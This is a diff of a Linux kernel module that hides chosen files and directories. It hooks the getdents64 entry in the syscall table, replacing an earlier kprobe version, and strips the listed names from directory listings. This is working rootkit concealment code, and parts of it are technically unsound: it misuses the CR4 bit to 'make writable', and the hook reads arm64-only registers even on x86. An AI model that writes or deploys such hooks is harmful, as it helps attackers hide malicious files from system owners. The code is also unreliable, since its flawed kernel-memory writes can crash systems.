@@ -1,16 +1,17 @@
 /*
  * hook_manager.c - Hook core manager
- * File hiding module - 使用 kprobe 方式（更安全）
+ * File hiding module - 使用 syscall table hook 方式
  */
 
 #include <linux/module.h>
-#include <linux/kprobes.h>
 #include <linux/kallsyms.h>
 #include <linux/slab.h>
 #include <linux/spinlock.h>
 #include <linux/string.h>
 #include <linux/uaccess.h>
-#include <linux/ptrace.h>
+#include <linux/fcntl.h>
+#include <linux/unistd.h>
+#include <linux/set_memory.h>
 
 #include "hook.h"
 
@@ -24,41 +25,23 @@ static struct hidden_entry hidden_files[MAX_HIDDEN_FILES];
 static int hidden_count;
 static DEFINE_SPINLOCK(hidden_lock);
 
-/* Symbol resolver via kprobe */
-static void *(*kallsyms_lookup_name_fn)(const char *name);
+/* Syscall table */
+static void **sys_call_table_ptr;
 
-static int kallsyms_kp_pre(struct kprobe *p, struct pt_regs *regs)
-{
-	return 0;
-}
+#define SYSCALL_GETDENTS64_NR __NR_getdents64
 
-static struct kprobe kp_kallsyms = {
-	.symbol_name = "kallsyms_lookup_name",
-	.pre_handler = kallsyms_kp_pre,
+typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *regs);
+
+static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
+
+/* Directory entry structure */
+struct linux_dirent64 {
+	u64 d_ino;
+	s64 d_off;
+	unsigned short d_reclen;
+	unsigned char d_type;
+	char d_name[256];
 };
-
-/* 获取符号地址 */
-static int init_symbol_resolver(void)
-{
-	int ret;
-
-	ret = register_kprobe(&kp_kallsyms);
-	if (ret < 0) {
-		pr_err("hook: failed to register kallsyms kprobe: %d\n", ret);
-		return ret;
-	}
-
-	kallsyms_lookup_name_fn = (void *)kp_kallsyms.addr;
-	pr_info("hook: kallsyms_lookup_name = %px\n", kallsyms_lookup_name_fn);
-
-	unregister_kprobe(&kp_kallsyms);
-	return 0;
-}
-
-/* Getdents64 syscall number */
-#ifndef __NR_getdents64
-#define __NR_getdents64 61
-#endif
 
 int add_hidden_file(const char *name, bool is_dir)
 {
@@ -90,7 +73,7 @@ int add_hidden_file(const char *name, bool is_dir)
 	hidden_count++;
 
 	spin_unlock_irqrestore(&hidden_lock, flags);
-	pr_info("hook: added hidden %s: %s\n", is_dir ? "dir" : "file", name);
+	pr_info("[hidefile] add hidden %s: %s\n", is_dir ? "dir" : "file", name);
 	return 0;
 }
 
@@ -106,7 +89,7 @@ int remove_hidden_file(const char *name)
 		    strcmp(hidden_files[i].name, name) == 0) {
 			hidden_files[i].active = false;
 			spin_unlock_irqrestore(&hidden_lock, flags);
-			pr_info("hook: removed hidden: %s\n", name);
+			pr_info("[hidefile] remove hidden: %s\n", name);
 			return 0;
 		}
 	}
@@ -151,36 +134,11 @@ void clear_hidden_list(void)
 	hidden_count = 0;
 
 	spin_unlock_irqrestore(&hidden_lock, flags);
-	pr_info("hook: hidden list cleared\n");
+	pr_info("[hidefile] hidden list cleared\n");
 }
 
-/* Directory entry structure */
-struct linux_dirent64 {
-	u64 d_ino;
-	s64 d_off;
-	unsigned short d_reclen;
-	unsigned char d_type;
-	char d_name[256];
-};
-
-/* Kprobe for sys_getdents64 - 使用 return handler */
-static int hidden_entries_count;
-
-/* Entry handler - 保存参数 */
-static int getdents64_rp_pre(struct kretprobe_instance *ri, struct pt_regs *regs)
-{
-	/* 在 entry 时保存 dirent 参数到 instance->data */
-	void *dirent;
-#ifdef __aarch64__
-	dirent = (void *)regs->regs[1];
-#else
-	dirent = (void *)regs->di;
-#endif
-	memcpy(ri->data, &dirent, sizeof(dirent));
-	return 0;
-}
-
-static int getdents64_rp_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
+/* Hooked getdents64 */
+static asmlinkage long hook_getdents64(const struct pt_regs *regs)
 {
 	long ret;
 	struct linux_dirent64 __user *dirent;
@@ -188,27 +146,25 @@ static int getdents64_rp_handler(struct kretprobe_instance *ri, struct pt_regs *
 	struct linux_dirent64 *curr, *write_ptr;
 	int count, new_count;
 	char name[256];
-	int entries_checked = 0, entries_hidden = 0;
+	int entries_hidden = 0;
 	int i;
 
-	/* 从 entry handler 保存的数据中获取 dirent */
-	memcpy(&dirent, ri->data, sizeof(dirent));
+	/* Get arguments: x0=fd, x1=dirent */
+	dirent = (struct linux_dirent64 __user *)regs->regs[1];
 
-	/* 获取返回值 - x0 for arm64 */
-#ifdef __aarch64__
-	ret = regs->regs[0];
-#else
-	ret = regs->ax;
-#endif
+	/* Call original */
+	ret = orig_getdents64(regs);
 
 	if (ret <= 0)
-		return 0;
+		return ret;
 
 	count = (int)ret;
 
-	pr_info("[hidefile] getdents64 handler: ret=%d, dirent=%px\n", (int)ret, dirent);
+	/* Skip if no hidden entries configured */
+	if (hidden_count == 0)
+		return ret;
 
-	/* 打印隐藏列表 */
+	pr_info("[hidefile] getdents64 hooked: ret=%d, dirent=%px\n", (int)ret, dirent);
 	pr_info("[hidefile] hidden list (%d entries):\n", hidden_count);
 	for (i = 0; i < hidden_count; i++) {
 		if (hidden_files[i].active)
@@ -216,19 +172,21 @@ static int getdents64_rp_handler(struct kretprobe_instance *ri, struct pt_regs *
 				i, hidden_files[i].name, hidden_files[i].is_dir);
 	}
 
-	/* 分配临时缓冲区 */
+	/* Allocate kernel buffer */
 	kbuf = kmalloc(count + 256, GFP_ATOMIC);
-	if (!kbuf)
-		return 0;
+	if (!kbuf) {
+		pr_err("[hidefile] kmalloc failed\n");
+		return ret;
+	}
 
-	/* 复制用户空间数据 */
+	/* Copy from user space */
 	if (copy_from_user(kbuf, dirent, count)) {
 		pr_err("[hidefile] copy_from_user failed\n");
 		kfree(kbuf);
-		return 0;
+		return ret;
 	}
 
-	/* 过滤隐藏的条目 - 使用 write 指针压缩缓冲区 */
+	/* Filter hidden entries */
 	curr = kbuf;
 	write_ptr = kbuf;
 	new_count = 0;
@@ -244,14 +202,12 @@ static int getdents64_rp_handler(struct kretprobe_instance *ri, struct pt_regs *
 		memset(name, 0, sizeof(name));
 		strncpy(name, curr->d_name, sizeof(name) - 1);
 
-		entries_checked++;
-
 		if (is_hidden(name, curr->d_type == DT_DIR)) {
 			entries_hidden++;
 			pr_info("[hidefile] HIDING: name=%s, d_type=%d\n",
 				name, curr->d_type);
 		} else {
-			/* 非隐藏条目，复制到 write 位置 */
+			/* Keep this entry */
 			if (write_ptr != curr)
 				memcpy(write_ptr, curr, reclen);
 			write_ptr = (struct linux_dirent64 *)((char *)write_ptr + reclen);
@@ -261,83 +217,106 @@ static int getdents64_rp_handler(struct kretprobe_instance *ri, struct pt_regs *
 		curr = (struct linux_dirent64 *)((char *)curr + reclen);
 	}
 
-	pr_info("[hidefile] result: checked=%d, hidden=%d, orig_size=%d, new_size=%d\n",
-		entries_checked, entries_hidden, count, new_count);
+	pr_info("[hidefile] result: hidden=%d, orig=%d, new=%d\n",
+		entries_hidden, count, new_count);
 
-	/* 如果有隐藏的条目，更新结果 */
-	if (new_count < count && new_count > 0) {
-		if (!copy_to_user(dirent, kbuf, new_count)) {
-#ifdef __aarch64__
-			regs->regs[0] = new_count;
-#else
-			regs->ax = new_count;
-#endif
+	/* Copy back to user space if entries were hidden */
+	if (new_count < count) {
+		if (copy_to_user(dirent, kbuf, new_count)) {
+			pr_err("[hidefile] copy_to_user failed\n");
+			kfree(kbuf);
+			return ret;
 		}
+		ret = new_count;
 	}
 
 	kfree(kbuf);
-	return 0;
+	return ret;
 }
-
-static struct kretprobe rp_getdents64 = {
-#ifdef __aarch64__
-	.kp = { .symbol_name = "__arm64_sys_getdents64" },
-#else
-	.kp = { .symbol_name = "__x64_sys_getdents64" },
-#endif
-	.entry_handler = getdents64_rp_pre,
-	.handler = getdents64_rp_handler,
-	.data_size = sizeof(void *),
-	.maxactive = 4,
-};
 
 /* External vfs hook functions */
 extern int vfs_hook_init(void);
 extern void vfs_hook_exit(void);
 
-static bool kprobe_registered;
+static bool hooked;
+static unsigned long page_addr;
+static int page_order;
 
 static int __init hook_init(void)
 {
+	unsigned long *table;
+	unsigned long addr;
 	int ret;
 
-	pr_info("hook: initializing...\n");
+	pr_info("[hidefile] initializing...\n");
 
-	/* 初始化符号解析器 */
-	ret = init_symbol_resolver();
-	if (ret < 0) {
-		pr_err("hook: failed to init symbol resolver: %d\n", ret);
+	/* Find sys_call_table */
+	table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
+	if (!table) {
+		pr_err("[hidefile] sys_call_table not found\n");
+		return -ENOENT;
+	}
+	sys_call_table_ptr = (void **)table;
+	pr_info("[hidefile] sys_call_table = %px\n", sys_call_table_ptr);
+
+	/* Save original */
+	orig_getdents64 = (typeof(orig_getdents64))sys_call_table_ptr[SYSCALL_GETDENTS64_NR];
+	if (!orig_getdents64) {
+		pr_err("[hidefile] original getdents64 not found\n");
+		return -ENOENT;
+	}
+	pr_info("[hidefile] orig_getdents64 = %px\n", orig_getdents64);
+
+#ifdef CONFIG_X86_64
+	/* Make writable */
+	cr4_set_bits((unsigned long *)X86_CR4_WP);
+#elif defined(CONFIG_ARM64)
+	/* Make page writable for ARM64 */
+	addr = (unsigned long)sys_call_table_ptr;
+	page_addr = addr & PAGE_MASK;
+	page_order = get_order(sizeof(void *) * SYSCALL_GETDENTS64_NR);
+	ret = set_memory_rw(page_addr, 1 << page_order);
+	if (ret) {
+		pr_err("[hidefile] set_memory_rw failed: %d\n", ret);
 		return ret;
 	}
+#endif
 
-	/* 注册 kretprobe */
-	ret = register_kretprobe(&rp_getdents64);
-	if (ret < 0) {
-		pr_err("hook: failed to register getdents64 kretprobe: %d\n", ret);
-		return ret;
-	}
-	kprobe_registered = true;
-	pr_info("hook: getdents64 kretprobe registered at %px\n", rp_getdents64.kp.addr);
+	/* Hook */
+	sys_call_table_ptr[SYSCALL_GETDENTS64_NR] = (void *)hook_getdents64;
+	hooked = true;
+
+#ifdef CONFIG_X86_64
+	cr4_clear_bits((unsigned long *)X86_CR4_WP);
+#endif
 
 	ret = vfs_hook_init();
 	if (ret < 0)
-		pr_warn("hook: vfs_hook_init failed: %d\n", ret);
+		pr_warn("[hidefile] vfs_hook_init failed: %d\n", ret);
 
-	pr_info("hook: module initialized\n");
+	pr_info("[hidefile] module initialized\n");
 	return 0;
 }
 
 static void __exit hook_exit(void)
 {
-	if (kprobe_registered) {
-		unregister_kretprobe(&rp_getdents64);
-		synchronize_rcu();
-		pr_info("hook: kretprobe unregistered, hidden %d entries\n", hidden_entries_count);
+	if (hooked) {
+#ifdef CONFIG_ARM64
+		set_memory_ro(page_addr, 1 << page_order);
+#endif
+#ifdef CONFIG_X86_64
+		cr4_set_bits((unsigned long *)X86_CR4_WP);
+#endif
+		sys_call_table_ptr[SYSCALL_GETDENTS64_NR] = (void *)orig_getdents64;
+#ifdef CONFIG_X86_64
+		cr4_clear_bits((unsigned long *)X86_CR4_WP);
+#endif
+		pr_info("[hidefile] unhooked getdents64\n");
 	}
 
 	vfs_hook_exit();
 	clear_hidden_list();
-	pr_info("hook: module exited\n");
+	pr_info("[hidefile] module exited\n");
 }
 
 module_init(hook_init);
